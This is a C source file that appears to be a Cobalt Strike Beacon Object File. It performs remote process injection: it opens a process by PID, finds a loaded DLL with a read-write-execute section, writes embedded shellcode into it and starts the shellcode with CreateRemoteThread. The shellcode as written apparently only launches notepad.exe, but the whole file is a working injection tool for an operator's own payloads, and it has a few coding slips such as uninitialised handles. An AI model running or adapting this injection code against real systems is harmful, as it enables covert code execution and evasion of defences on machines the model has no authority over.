#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <string.h>
#include "beacon.h"

// needed to resolve linker errors
void ___chkstk_ms() { }

// process and module definitions
#define MODULE "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll" // change this based on dll of operator's choosing
#define OFFSET  0x00000400 // change this based on dll of operator's choosing
#define PROCESSID  30996 // change this based on running process with target module loaded

// kernel32 BOF definitions for beacon linking
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINADVAPI WINAPI PSAPI$EnumProcessModulesEx(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);
WINADVAPI WINAPI PSAPI$GetModuleFileNameExA(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

// function name definitions for ease of use
#define OpenProcess             KERNEL32$OpenProcess
#define EnumProcessModulesEx    PSAPI$EnumProcessModulesEx
#define GetModuleFileNameExA    PSAPI$GetModuleFileNameExA
#define WriteProcessMemory      KERNEL32$WriteProcessMemory
#define CreateRemoteThread      KERNEL32$CreateRemoteThread
#define GetLastError            KERNEL32$GetLastError
#define CloseHandle             KERNEL32$CloseHandle

void go(char * buff, int len)
{
    HANDLE                  hProcess;
    HMODULE                 hModules[1024];
    DWORD                   cbNeeded;
    DWORD                   dwFilter;
    HMODULE                 hDll;
    PVOID                   rwxSection;

    unsigned char shellcode[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    // obtain handle to the target process with necessary access rights
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESSID);
    if (hProcess == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process. Error Code: %d\n", GetLastError());
        return 1;
    }

    if (!EnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded, dwFilter))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to Enumerate Modules. Error Code: %d\n", GetLastError());
        return 1;
    };

    for (INT i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
    {
        CHAR szModName[MAX_PATH];
        if (GetModuleFileNameExA(hProcess, hModules[i], szModName, sizeof(szModName)))
        {
            if (strcmp(szModName, MODULE) == 0)
            {
                hDll = hModules[i];
                break;
            };
        };
    };

    if (hDll == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to find module\n", GetLastError());
        return 1;
    };
    BeaconPrintf(CALLBACK_OUTPUT, "Remote DLL address: %p\n", hDll);

    rwxSection = (PVOID)((ULONG_PTR)hDll + (ULONG_PTR)OFFSET);
    BeaconPrintf(CALLBACK_OUTPUT, "Remote RWX section address: %p\n", rwxSection);
    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode address: %p\n", shellcode);
    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode length: %d\n", sizeof(shellcode));

    if (!WriteProcessMemory(hProcess, rwxSection, shellcode, sizeof(shellcode), NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %d\n", GetLastError());
        return 1;
    };

    if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxSection, NULL, 0, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to Create Thread in Remote Process and Execute. Error code: %lu\n", GetLastError());
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode Successfully Executed in Remote Thread\n");
    }

    // Close process and thread handles
    CloseHandle(hProcess);

    return 0;
}